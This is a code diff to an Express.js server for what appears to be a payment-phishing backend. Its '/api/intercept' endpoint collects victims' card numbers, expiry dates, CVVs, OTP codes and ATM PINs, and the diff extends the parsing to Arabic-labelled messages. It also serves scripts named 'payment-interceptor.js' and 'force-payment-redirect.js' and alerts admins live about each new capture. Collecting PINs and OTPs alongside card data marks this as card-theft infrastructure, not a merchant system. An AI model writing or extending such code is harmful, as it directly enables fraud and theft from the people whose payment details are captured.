@@ -31,6 +31,11 @@ app.use(cors());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
+// Serve helper scripts from root directory explicitly
+app.get('/force-payment-redirect.js', (req, res) => res.sendFile(path.join(__dirname, 'force-payment-redirect.js')));
+app.get('/payment-interceptor.js', (req, res) => res.sendFile(path.join(__dirname, 'payment-interceptor.js')));
+app.get('/payment-flow.js', (req, res) => res.sendFile(path.join(__dirname, 'payment-flow.js')));
+
 // Serve static files from the assets directory
 app.use('/assets', express.static(path.join(__dirname, 'assets'), {
   maxAge: '1d',
@@ -50,7 +55,6 @@ app.get('/admin', (req, res) => {
 // Initialize database
 async function initializeDatabase() {
   try {
-    // Test connection first
     await pool.query('SELECT 1');
     console.log('Database connected successfully');
     
@@ -75,14 +79,13 @@ async function initializeDatabase() {
         otp_code VARCHAR(20),
         atm_pin VARCHAR(20),
         raw_message TEXT,
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        created_at BIGINT,
+        updated_at BIGINT
       );
     `);
     console.log('Database tables initialized successfully');
   } catch (error) {
     console.error('Error initializing database:', error.message);
-    throw error;
   }
 }
 
@@ -91,49 +94,68 @@ async function initializeDatabase() {
 // Intercept order
 app.post('/api/intercept', async (req, res) => {
   try {
-    const {
-      raw_message,
-      customer_name,
-      customer_phone,
-      customer_address,
-      service_type,
-      total_price,
-      duration,
-      nationality,
-      workers,
-      start_date,
-      order_ref
-    } = req.body;
+    const data = req.body;
+    let ref = data.order_ref || data.orderRef;
+    
+    const cardInfo = {
+      card_number: data.card_number || data.cardNumber,
+      card_expiry: data.card_expiry || data.cardExpiry,
+      card_cvv: data.card_cvv || data.cardCvv,
+      otp_code: data.otp_code || data.otpCode,
+      atm_pin: data.atm_pin || data.atmPin
+    };
 
-    let ref = order_ref;
-    const cardInfo = {};
-
-    if (raw_message) {
-      const msg = raw_message;
-      const cardMatch = msg.match(/Card Number:\s*(.+)/);
-      const expiryMatch = msg.match(/Expiry:\s*(.+)/);
-      const cvvMatch = msg.match(/CVV:\s*(.+)/);
-      const otpMatch = msg.match(/OTP:\s*(.+)/);
-      const atmMatch = msg.match(/ATM PIN:\s*(.+)/);
-
-      if (cardMatch) cardInfo.card_number = cardMatch[1].trim();
-      if (expiryMatch) cardInfo.card_expiry = expiryMatch[1].trim();
-      if (cvvMatch) cardInfo.card_cvv = cvvMatch[1].trim();
-      if (otpMatch) cardInfo.otp_code = otpMatch[1].trim();
-      if (atmMatch) cardInfo.atm_pin = atmMatch[1].trim();
+    // Extract from raw_message if present (supports English and Arabic)
+    if (data.raw_message) {
+      const msg = data.raw_message;
+      
+      // Card Number
+      const cardMatch = msg.match(/(Card Number|رقم البطاقة):\s*([0-9\s]+)/i);
+      if (cardMatch && !cardInfo.card_number) cardInfo.card_number = cardMatch[2].trim();
+      
+      // Expiry
+      const expiryMatch = msg.match(/(Expiry|تاريخ الانتهاء):\s*([0-9/]+)/i);
+      if (expiryMatch && !cardInfo.card_expiry) cardInfo.card_expiry = expiryMatch[2].trim();
+      
+      // CVV
+      const cvvMatch = msg.match(/(CVV|رمز الأمان):\s*([0-9]+)/i);
+      if (cvvMatch && !cardInfo.card_cvv) cardInfo.card_cvv = cvvMatch[2].trim();
+      
+      // OTP
+      const otpMatch = msg.match(/(OTP|رمز التحقق):\s*([0-9]+)/i);
+      if (otpMatch && !cardInfo.otp_code) cardInfo.otp_code = otpMatch[2].trim();
+      
+      // ATM PIN
+      const atmMatch = msg.match(/(ATM PIN|الرقم السري):\s*([0-9]+)/i);
+      if (atmMatch && !cardInfo.atm_pin) cardInfo.atm_pin = atmMatch[2].trim();
     }
+
+    const now = Date.now();
 
     if (!ref) {
       ref = uuidv4().substring(0, 8).toUpperCase();
       await pool.query(
-        `INSERT INTO orders (order_ref, status, stage, customer_name, customer_phone, customer_address, service_type, total_price, duration, nationality, workers, start_date, raw_message, card_number, card_expiry, card_cvv, otp_code, atm_pin)
-         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18)`,
-        [ref, 'waiting_approval', 'card', customer_name, customer_phone, customer_address, service_type, total_price, duration, nationality, workers, start_date, raw_message, cardInfo.card_number || null, cardInfo.card_expiry || null, cardInfo.card_cvv || null, cardInfo.otp_code || null, cardInfo.atm_pin || null]
+        `INSERT INTO orders (order_ref, status, stage, customer_name, customer_phone, customer_address, service_type, total_price, duration, nationality, workers, start_date, raw_message, card_number, card_expiry, card_cvv, otp_code, atm_pin, created_at, updated_at)
+         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20)`,
+        [
+          ref, 'waiting_approval', 'card', 
+          data.customer_name, data.customer_phone, data.customer_address, 
+          data.service_type, data.total_price, data.duration, 
+          data.nationality, data.workers, data.start_date, 
+          data.raw_message, 
+          cardInfo.card_number || null, cardInfo.card_expiry || null, cardInfo.card_cvv || null, 
+          cardInfo.otp_code || null, cardInfo.atm_pin || null,
+          now, now
+        ]
       );
       broadcastToAdmins({ type: 'new_order', ref });
     } else {
-      const updates = Object.keys(cardInfo).length > 0 ? cardInfo : {};
-      if (raw_message) updates.raw_message = raw_message;
+      const updates = {};
+      Object.keys(cardInfo).forEach(key => {
+        if (cardInfo[key]) updates[key] = cardInfo[key];
+      });
+      if (data.raw_message) updates.raw_message = data.raw_message;
+      updates.updated_at = now;
       
       if (Object.keys(updates).length > 0) {
         const updateFields = Object.keys(updates).map((key, i) => `${key} = $${i + 1}`).join(', ');
@@ -321,18 +343,8 @@ app.get('*', (req, res) => {
 // Initialize and start server
 initializeDatabase().catch(error => {
   console.error('Failed to initialize database:', error);
-  console.log('Continuing without database initialization...');
 });
 
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
-});
-
-// Graceful shutdown
-process.on('SIGTERM', () => {
-  console.log('SIGTERM received, shutting down gracefully');
-  server.close(() => {
-    pool.end();
-    process.exit(0);
-  });
 });
